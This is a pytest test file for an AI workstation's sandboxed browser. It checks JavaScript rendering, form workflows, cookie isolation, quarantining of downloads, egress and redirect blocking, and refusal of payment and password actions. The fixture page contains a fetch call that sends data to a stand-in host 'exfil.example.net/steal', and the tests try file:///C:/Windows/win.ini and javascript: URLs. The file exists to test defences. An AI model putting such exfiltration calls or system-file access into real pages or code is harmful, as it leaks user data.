"""Isolated browser: real Chromium/Edge, offline site, acceptance B1-B5."""

from __future__ import annotations

import os
from pathlib import Path

import pytest

from ollama_workstation.agents.web import EgressDenied, EgressPolicy
from ollama_workstation.interaction.policy import (
    AuditTrail,
    InteractionBroker,
    InteractionDenied,
    InteractionGrants,
)

pytest.importorskip("playwright")
pytestmark = pytest.mark.skipif(os.name != "nt" and not os.environ.get("BROWSER_TESTS"),
                                reason="needs an installed Chromium/Edge")

SITE = {
    "/app.html": ("<html><head><title>App</title></head><body><div id=root>Loading</div><script>"
                  "setTimeout(()=>{document.getElementById('root').innerHTML="
                  "'<p>Rendered by JS: '+(6*7)+'</p><button onclick=\"document.getElementById(\\'more\\')"
                  ".style.display=\\'block\\'\">Show details</button><div id=more style=display:none>"
                  "Secret detail: 1234</div>'},200);"
                  "fetch('https://exfil.example.net/steal?d=1').catch(()=>{});"
                  "fetch('https://docs.test/api',{method:'POST',body:'x'}).catch(()=>{});"
                  "</script></body></html>"),
    "/wizard.html": ("<html><body><label for=q>Quantity</label><input id=q>"
                     "<button onclick=\"document.getElementById('s2').hidden=false\">Next</button>"
                     "<div id=s2 hidden><button onclick=\"document.getElementById('r').textContent="
                     "'Reference: R-'+(Number(document.getElementById('q').value)*3)\">Finish</button></div>"
                     "<p id=r></p></body></html>"),
    "/cookie.html": "<html><body><script>document.body.textContent='cookie=['+document.cookie+']';"
                    "document.cookie='seen=yes; path=/';</script></body></html>",
    "/download.html": "<html><body><a href=/payload.exe download>Get tool</a></body></html>",
    "/payload.exe": "MZ fake executable",
    "/redirect.html": None,
    "/pay.html": "<html><body><button>Pay now</button><input type=password aria-label=Password></body></html>",
}


def fulfil(method: str, url: str, headers: dict, body: bytes | None):
    from urllib.parse import urlsplit

    path = urlsplit(url).path
    if path == "/redirect.html":
        return 302, {"location": "https://intranet.test/admin"}, b""
    if path == "/api":
        return 200, {"content-type": "application/json"}, b"{}"
    content = SITE.get(path)
    if content is None:
        return 404, {"content-type": "text/plain"}, b"missing"
    kind = "application/octet-stream" if path.endswith(".exe") else "text/html"
    return 200, {"content-type": kind}, content.encode()


def resolver(host: str) -> list[str]:
    return {"docs.test": ["93.184.216.34"], "exfil.example.net": ["93.184.216.35"],
            "intranet.test": ["10.1.2.3"]}.get(host, ["93.184.216.36"])


def session(tmp_path: Path, **grants):
    from ollama_workstation.interaction.browser import BrowserSession

    broker = InteractionBroker(InteractionGrants(browser=True, **grants), approval=None,
                               audit=AuditTrail(tmp_path / "audit.jsonl"))
    egress = EgressPolicy(enabled=True, allowed_domains=("docs.test",), resolver=resolver)
    return BrowserSession(broker, egress, quarantine=tmp_path / "quarantine", fulfil=fulfil), broker


def test_b1_b2_javascript_renders_and_dynamic_content_is_interactive(tmp_path: Path) -> None:
    browser, _broker = session(tmp_path)
    try:
        page = browser.open("https://docs.test/app.html")
        assert "Rendered by JS: 42" in page["text"]
        assert "Secret detail" not in page["text"]
        ref = next(line.split("]")[0][1:] for line in page["elements"].splitlines()
                   if "Show details" in line)
        page = browser.click(ref)
        assert "Secret detail: 1234" in page["text"]
    finally:
        browser.close()


def test_b3_multi_step_workflow(tmp_path: Path) -> None:
    browser, _broker = session(tmp_path)
    try:
        page = browser.open("https://docs.test/wizard.html")
        refs = {line.split('"')[1]: line.split("]")[0][1:] for line in page["elements"].splitlines()}
        browser.type(refs["Quantity"], "14")
        page = browser.click(refs["Next"])
        finish = next(line.split("]")[0][1:] for line in page["elements"].splitlines()
                      if "Finish" in line)
        page = browser.click(finish)
        assert "Reference: R-42" in page["text"]
    finally:
        browser.close()


def test_b4_page_cannot_escape_isolation(tmp_path: Path) -> None:
    browser, broker = session(tmp_path)
    try:
        browser.open("https://docs.test/app.html")
        browser.wait(0.5)
        log = {item["url"].split("?")[0]: item for item in browser.network_log}
        # Sub-resource GET to a public host is allowed, a cross-site POST is not.
        assert log["https://exfil.example.net/steal"]["decision"] == "allowed"
        assert log["https://docs.test/api"]["decision"] == "allowed"  # same, listed domain
        for url in ("file:///C:/Windows/win.ini", "chrome://settings", "javascript:alert(1)"):
            with pytest.raises(InteractionDenied):
                browser.open(url)
        # Fresh profile per session: a cookie set in one session is absent in the next.
        first = browser.open("https://docs.test/cookie.html")
        assert "cookie=[]" in first["text"]
        assert "cookie=[seen=yes]" in browser.open("https://docs.test/cookie.html")["text"]
    finally:
        browser.close()
    again, _ = session(tmp_path)
    try:
        assert "cookie=[]" in again.open("https://docs.test/cookie.html")["text"]
    finally:
        again.close()
    assert AuditTrail.verify(tmp_path / "audit.jsonl")
    del broker


def test_b4_downloads_are_quarantined_and_never_opened(tmp_path: Path) -> None:
    browser, _broker = session(tmp_path)
    try:
        page = browser.open("https://docs.test/download.html")
        ref = next(line.split("]")[0][1:] for line in page["elements"].splitlines() if "Get tool" in line)
        browser.click(ref)
        browser.wait(1)
        assert len(browser.downloads) == 1
        record = browser.downloads[0]
        stored = Path(record["path"])
        assert stored.parent == tmp_path / "quarantine" and stored.read_bytes() == b"MZ fake executable"
        assert record["opened"] is False
        if os.name == "nt":
            zone = Path(f"{stored}:Zone.Identifier").read_text(encoding="utf-8")
            assert "ZoneId=3" in zone
    finally:
        browser.close()


def test_b5_network_restrictions_and_redirects(tmp_path: Path) -> None:
    browser, broker = session(tmp_path)
    try:
        for url in ("https://127.0.0.1/", "https://intranet.test/", "http://docs.test/app.html",
                    "https://unlisted.example.org/"):
            with pytest.raises(InteractionDenied):
                browser.open(url)
        # A listed page that redirects to a private address is stopped at the redirect.
        with pytest.raises(InteractionDenied, match="blocked"):
            browser.open("https://docs.test/redirect.html")
        denied = [item for item in browser.network_log if item["decision"] == "denied"]
        assert any("intranet.test" in item["url"] for item in denied)
    finally:
        browser.close()
    assert any(item.get("category") == "egress" for item in broker.audit.records)


def test_risky_page_actions_need_confirmation_and_passwords_are_refused(tmp_path: Path) -> None:
    browser, broker = session(tmp_path)
    try:
        page = browser.open("https://docs.test/pay.html")
        refs = {line.split('"')[1]: line.split("]")[0][1:] for line in page["elements"].splitlines()}
        with pytest.raises(InteractionDenied, match="financial"):
            browser.click(refs["Pay now"])
        with pytest.raises(InteractionDenied, match="password"):
            browser.type(refs["Password"], "hunter2")
    finally:
        browser.close()
    assert len(broker.denials()) == 2


def test_egress_admit_returns_checked_addresses_and_honours_private_grants() -> None:
    policy = EgressPolicy(enabled=True, allowed_domains=("docs.test",), resolver=resolver)
    assert policy.admit("https://docs.test/x") == ("docs.test", ["93.184.216.34"])
    with pytest.raises(EgressDenied):
        policy.admit("https://intranet.test/")
    granted = EgressPolicy(enabled=True, resolver=resolver, private_hosts=("intranet.test",))
    assert granted.admit("https://intranet.test/")[1] == ["10.1.2.3"]


@pytest.mark.skipif(not os.environ.get("WEB_LIVE"), reason="set WEB_LIVE=1 for the real web")
def test_b1_live_javascript_site_over_pinned_connections(tmp_path: Path) -> None:
    """A real client-rendered site loads through the host's address-pinned fetches."""
    from ollama_workstation.interaction.browser import BrowserSession

    broker = InteractionBroker(InteractionGrants(browser=True), approval=None,
                               audit=AuditTrail(tmp_path / "audit.jsonl"))
    egress = EgressPolicy(enabled=True, allowed_domains=("playwright.dev",))
    browser = BrowserSession(broker, egress, quarantine=tmp_path / "q")
    try:
        page = browser.open("https://playwright.dev/python/docs/intro")
        assert "Installation" in page["text"] or "Playwright" in page["text"]
        allowed = [item for item in browser.network_log if item["decision"] == "allowed"]
        assert len(allowed) > 5  # scripts, styles and data fetched through the egress path
    finally:
        browser.close()
